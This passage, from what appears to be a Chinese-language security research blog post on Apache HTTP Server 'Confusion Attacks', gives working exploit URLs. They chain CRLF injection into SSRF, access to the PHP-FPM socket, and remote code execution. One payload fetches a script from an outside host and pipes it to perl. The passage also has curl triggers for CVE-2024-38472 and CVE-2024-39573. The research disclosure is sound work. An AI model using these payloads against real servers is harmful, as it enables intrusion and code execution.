+<h4 id="✔️-3-2-2-Arbitrary-Handler-to-Full-SSRF"><a href="#✔️-3-2-2-Arbitrary-Handler-to-Full-SSRF" class="headerlink" title="✔️ 3-2-2. Arbitrary Handler to Full SSRF"></a>✔️ 3-2-2. Arbitrary Handler to Full SSRF</h4><p>呼叫 <code>mod_proxy</code> 存取任何協議以及任意網址當然也不在話下，例如：</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;ooo</strong></em> %0d%0a<br><em><strong>Content-Type:proxy:http<span>:&#x2F;&#x2F;example.com&#x2F;%3F</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<p>另外這也是一個可以完整控制 HTTP 請求還有取得所有 HTTP 回應的 SSRF！ 稍微可惜的一點是在存取 Cloud Metadata 時會被 <code>mod_proxy</code> 會自動加上 <code>X-Forwarded-For</code> 標頭導致被 EC2 及 GCP 的 <a target="_blank" rel="noopener" href="https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations">Metadata 保護機制</a>阻擋，否則這會是一個更強大的攻擊手法。</p>
+<h4 id="✔️-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket"><a href="#✔️-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket" class="headerlink" title="✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket"></a>✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</h4><p>然而 <code>mod_proxy</code> 提供了一個更「方便」的功能 —— 可以存取本地的 Unix Domain Socket！ 😉</p>
+<p>這裡展示透過存取 PHP-FPM 本地的 Unix Domain Socket 去執行位於 <code>/tmp/</code> 下的 PHP 後門：</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;ooo</strong></em> %0d%0a<br><em><strong>Content-Type:proxy:unix:&#x2F;run&#x2F;php&#x2F;php-fpm.sock|fcgi:&#x2F;&#x2F;127.0.0.1&#x2F;tmp&#x2F;ooo.php</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<p>這個手法理論上還存在著更多的可能性，例如協議走私 (在 HTTP&#x2F;HTTPS 協議間走私 FastCGI 😏) 或其它易受影響的 Local Sockets 等，這都交給有興趣的人繼續研究了。</p>
+<h4 id="✔️-3-2-4-Arbitrary-Handler-to-RCE"><a href="#✔️-3-2-4-Arbitrary-Handler-to-RCE" class="headerlink" title="✔️ 3-2-4. Arbitrary Handler to RCE"></a>✔️ 3-2-4. Arbitrary Handler to RCE</h4><p>最後來展示一下如何透過一個常見的 CTF 小技巧把這個攻擊手法轉化成 RCE！ 由於 PHP 官方的 <a target="_blank" rel="noopener" href="https://hub.docker.com/_/php">Docker 映像檔</a> 在建構時引入了 PEAR 這套命令列 PHP 套件管理工具，透過其中的 <code>Pearcmd.php</code> 作為入口點可以讓我們達成更進一步的利用，詳細的歷史及原理可以參考由 <a target="_blank" rel="noopener" href="https://x.com/phithon_xg">Phith0n</a> 撰寫的 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP LFI 總結文</a>。</p>
+<p>這裡我們利用在 <code>run-tests</code> 內的 Command Injection 來完成整個攻擊鏈，詳細的攻擊鏈如下：</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a  </p>
+<p><em><strong>Location:&#x2F;ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw&#x2F;x|perl) %2b alltests.php</strong></em> %0d%0a  </p>
+<p><em><strong>Content-Type:proxy:unix:&#x2F;run&#x2F;php&#x2F;php-fpm.sock|fcgi:&#x2F;&#x2F;127.0.0.1&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</strong></em> %0d%0a  </p>
+<p>%0d%0a</p>
+</blockquote>
+<p>網路上經常在 Security Advisory 或 Bug Bounty 看到把 CRLF Injection 或 Header Injection 當成 XSS 報告，雖然確實有機會透過 SSO 串出 Account Takeover 等精彩漏洞，但請不要忘了它也能串出 Server-Side RCE，這個示範證明了它的可能！</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/c46787187d97fc85-11.png"></p>
+<h2 id="🔥-4-其它漏洞"><a href="#🔥-4-其它漏洞" class="headerlink" title="🔥 4. 其它漏洞"></a>🔥 4. 其它漏洞</h2><p>基本上整個 Confusion Attacks 系列到這邊差不多告一個段落，然而在研究 Apache HTTP Server 的過程中還有些值得一提的漏洞因此將它們獨立出來。</p>
+<h3 id="⚔️-CVE-2024-38472-基於-Windows-UNC-的-SSRF"><a href="#⚔️-CVE-2024-38472-基於-Windows-UNC-的-SSRF" class="headerlink" title="⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF"></a>⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF</h3><p>首先是 <code>apr_filepath_merge()</code> 函數在 Windows 的實作允許使用 UNC 路徑，下面提供兩種不同的觸發路徑讓攻擊者可以向任意主機發起 NTLM 認證：</p>
+<h4 id="✔️-透過-HTTP-請求解析器觸發"><a href="#✔️-透過-HTTP-請求解析器觸發" class="headerlink" title="✔️ 透過 HTTP 請求解析器觸發"></a>✔️ 透過 HTTP 請求解析器觸發</h4><p>想要直接透過 HTTP 請求觸發需要在 Httpd 中設置額外的設定，雖然這個設定第一眼看起來有點不現實，但似乎經常與 Tomcat (<code>mod_jk</code>、<code>mod_proxy_ajp</code>) 或是與 <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes">PATH_INFO</a> 一起出現：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AllowEncodedSlashes</span> <span class="literal">On</span></span><br></pre></td></tr></table></figure>
+<p>另外由於 Httpd 在 2.4.49 後重寫了核心 HTTP 請求解析器邏輯，要在大於此版本的 Httpd 上觸發漏洞需要再額外加上一個設定：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AllowEncodedSlashes</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">MergeSlashes</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure>
+<p>透過兩個 <code>%5C</code> 可以使強迫 Httpd 向 <code>attacker-server</code> 發起 NTLM 認證，實務上也可透過 <a target="_blank" rel="noopener" href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a> 的方式將此 SSRF 轉化成 RCE！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/%5C%5Cattacker-server/path/to</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2024-08-confusion-attacks-ch/444e2b7b11c6c80e-12.png"></p>
+<h4 id="✔️-透過-Type-Map-觸發"><a href="#✔️-透過-Type-Map-觸發" class="headerlink" title="✔️ 透過 Type-Map 觸發"></a>✔️ 透過 Type-Map 觸發</h4><p><a target="_blank" rel="noopener" href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235">Debian&#x2F;Ubuntu 的 Httpd 發行版</a>中預設啟用了 Type-Map：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddHandler</span> type-map var</span><br></pre></td></tr></table></figure>
+<p>透過上傳一個 <code>.var</code> 檔案到伺服器，將其中 URI 欄位指定成 UNC 路徑也可強迫伺服器向攻擊者發起 NTLM 認證，這也是我所提出的<a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle">第二個 <code>.var</code> 小技巧</a> 😉</p>
+<h3 id="⚔️-CVE-2024-39573-基於-RewriteRule-前綴可完全控制的-SSRF"><a href="#⚔️-CVE-2024-39573-基於-RewriteRule-前綴可完全控制的-SSRF" class="headerlink" title="⚔️ CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF"></a>⚔️ CVE-2024-39573 - 基於 <code>RewriteRule</code> 前綴可完全控制的 SSRF</h3><p>最後則是當位於 <code>Server Config</code> 或是 <code>VirtualHost</code> 中的 <code>RewriteRule</code> 前綴完全可控時，可以呼叫到 Proxy 以及相關子模組：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span> ^/broken(.*) $<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>透過下列網址可將請求轉交給 <code>mod_proxy</code> 處理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/brokenproxy:unix:/run/[...]|http://path/to</span><br></pre></td></tr></table></figure>
+<p>但如果網管有好好測試，就會發現這樣子的規則是不實際的，所以原本只把它當成另外一個漏洞的搭配組合一起回報，沒想到這個行為也被當成一個安全邊界修復。 再隨著修補出來後也看到其他研究員把同樣行為套用在 Windows UNC 上獲得另外一個額外的 CVE。</p>
+<h1 id="未來研究方向"><a href="#未來研究方向" class="headerlink" title="未來研究方向"></a>未來研究方向</h1><p>最後是關於這份研究的未來的一些展望以及可加強的地方，基本上 Confusion Attacks 仍然是一個很有潛力的攻擊面，尤其是我這次的研究主要也只專注在兩個欄位上而已，只要 Apache HTTP Server 沒有好好從底層進行結構性加強或提供給開發者一個好的開發標準，相信未來還會有更多「混淆」出現！</p>
+<p>至於還有哪些方面可以加強呢？ 其實不同的 Httpd 發行版會有不同的設定檔案，因此其它的 Unix-Like 系統例如 RHEL 家族、BSD 系列，甚至使用到 Httpd 的套裝軟體，它們都有機會出現更多可跳脫的重寫規則、更多厲害的 Local Gadgets 甚至意料外的符號跳躍等等 ，就交給有興趣的人繼續吧。</p>
+<p>最後由於時程因素，來不及分享更多在實際網站、設備，甚至開源專案上發現並利用的真實案例，不過你應該已經可以想像 —— 在真實世界中絕對還藏著千千萬萬個比想像中還要大量未開採的規則、可繞過的認證，以及隱藏在檯面下的 CGI，至於如何把這篇裡面所講到的技巧實際應用在全世界上？ 接下來就是你們的任務了！</p>
+<h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>維護一個 Open Source 專案真的是一件很困難的事，尤其在讓使用者方便的同時兼顧舊版本的相容性，稍有不慎可能就會造成整個系統被攻破 (例如 Httpd 2.4.49 中因為一個路徑處理邏輯小改動導致災難性的 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773">CVE-2021-41773</a>)，整個開發過程必須要小心翼翼的踩在一堆遺留程式碼以及技術債上。 所以如果真的有 Apache HTTP Server 的開發者看到這篇文我想說： 謝謝你們的貢獻！</p>
+<!-- flag of hidden posts -->
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
